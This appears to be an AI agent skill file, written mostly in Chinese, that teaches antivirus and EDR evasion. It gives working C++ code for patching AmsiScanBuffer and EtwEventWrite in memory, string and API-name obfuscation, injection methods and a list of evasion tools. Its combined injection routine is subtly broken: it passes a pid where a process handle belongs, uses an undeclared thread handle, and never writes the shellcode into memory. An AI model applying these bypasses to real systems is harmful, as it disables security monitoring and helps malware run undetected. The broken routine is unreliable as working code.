---
name: "av-evasion"
description: "Anti-Virus (AV) Evasion comprehensive techniques including static, dynamic, behavioral, and memory-based evasion methods"
version: "1.0.0"
---

# AV Evasion (Anti-Virus Evasion)

> Anti-Virus (AV) Evasion refers to the techniques and methods used by red team operators, penetration testers, and malware developers to bypass or circumvent antivirus software, Endpoint Detection and Response (EDR) systems, and other security controls.

## 概述

现代渗透测试中，安全控制措施变得越来越复杂，掌握AV/EDR绕过技术是红队操作员的必备技能。

## 检测机制

### 静态检测

- **基于签名的检测**：扫描已知恶意软件的模式、字符串、签名和哈希值
- **启发式分析**：检查代码和行为而不仅仅是签名
- **行为分析**：静态分析代码以识别潜在的有害序列、API调用或特征
- **模式匹配**：YARA规则和机器学习模型识别字符串、导入表和代码结构
- **文件特征**：检查PE头、节信息、时间戳和编译产物

### 动态检测

- **运行时监控**：记录API调用、系统函数调用和进程操作
- **行为监控**：跟踪类似恶意模式的操作序列
- **API挂钩**：许多EDR挂钩关键API函数
- **内存扫描**：扫描进程内存中的shellcode模式
- **ETW (Event Tracing for Windows)**：PowerShell、.NET和系统操作的事件日志记录
- **AMSI (Antimalware Scan Interface)**：在执行前扫描脚本内容

## 静态免杀技术

### 字符串加密

使用加密、编码或动态构建来隐藏敏感字符串。

```cpp
// XOR加密示例
char encrypted[] = {0x73^0xAA, 0x65^0xAA, 0x63^0xAA, 0x72^0xAA, 0x65^0xAA, 0x74^0xAA};
char key = 0xAA;
for (int i = 0; i < 6; i++) {
    encrypted[i] ^= key;
}
```

### API混淆

- **函数哈希**：哈希函数名并从导出表中动态解析
- **GetProcAddress混淆**：手动解析DLL导出表

```cpp
DWORD HashFunctionName(char* funcName) {
    DWORD hash = 5381;
    while (*funcName) {
        hash = ((hash << 5) + hash) + *funcName;
        funcName++;
    }
    return hash;
}
```

### 代码混淆

- **控制流扁平化**：将线性代码分解为switch语句或状态机
- **垃圾代码插入**：添加无意义的命令和分支

## 动态免杀技术

### AMSI绕过

AMSI (Antimalware Scan Interface) 被PowerShell、.NET等调用来在执行前扫描脚本。

```cpp
// 修补AmsiScanBuffer
HMODULE hAmsi = LoadLibraryA("amsi.dll");
FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
DWORD oldProtect;
VirtualProtect(pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
*(BYTE*)pAmsiScanBuffer = 0xC3; // ret指令
VirtualProtect(pAmsiScanBuffer, 1, oldProtect, &oldProtect);
```

### ETW绕过

```cpp
// 修补EtwEventWrite
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
DWORD oldProtect;
VirtualProtect(pEtwEventWrite, 3, PAGE_EXECUTE_READWRITE, &oldProtect);
*((BYTE*)pEtwEventWrite) = 0x33;
*((BYTE*)pEtwEventWrite + 1) = 0xC0;
*((BYTE*)pEtwEventWrite + 2) = 0xC3;
VirtualProtect(pEtwEventWrite, 3, oldProtect, &oldProtect);
```

### API挂钩绕过

使用用户态unhook技术移除EDR挂钩。

## 内存免杀技术

### 进程注入

- **远程线程注入**
- **进程镂空 (Process Hollowing)**
- **进程伪装 (Process Doppelgänging)**
- **反射式加载 (Reflective Loading)**

### 休眠代码

加密的代码仅在特定条件下才解密执行。

## 常用工具

| 工具 | 描述 | 语言 |
|------|------|------|
| Veil | 免杀框架 | Python |
| AVET | 免杀工具包 | Python/Bash |
| Donut | .NET程序集shellcode生成器 | Rust |
| SysWhispers2 | 直接系统调用生成器 | Python/ASM |
| Al-Khaser | 沙箱检测工具 | C |
| Pafish | 虚拟机检测 | C |

## 免杀策略组合

```cpp
void AdvancedEvasion(DWORD pid, BYTE* shellcode, SIZE_T shellcodeSize) {
    // 1. 移除EDR挂钩
    UnhookNtdll();

    // 2. 绕过AMSI
    BypassAMSI();

    // 3. 使用syscall进行操作
    LPVOID pMem = NULL;
    SIZE_T size = shellcodeSize;
    NtAllocateVirtualMemory(pid, &pMem, 0, &size, 
                           MEM_COMMIT | MEM_RESERVE, 
                           PAGE_EXECUTE_READWRITE);

    // 4. 使用APC注入（比CreateRemoteThread更隐蔽）
    QueueUserAPC((PAPCFUNC)pMem, hTargetThread, 0);
}
```

## 最佳实践

1. **多层防护**：结合多种免杀技术
2. **持续更新**：保持对最新检测技术的了解
3. **测试验证**：在目标环境中测试免杀效果
4. **合法授权**：仅在获得授权的情况下使用

## 参考资源

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [ired.team](https://ired.team/)
- [malapi.io](https://malapi.io)
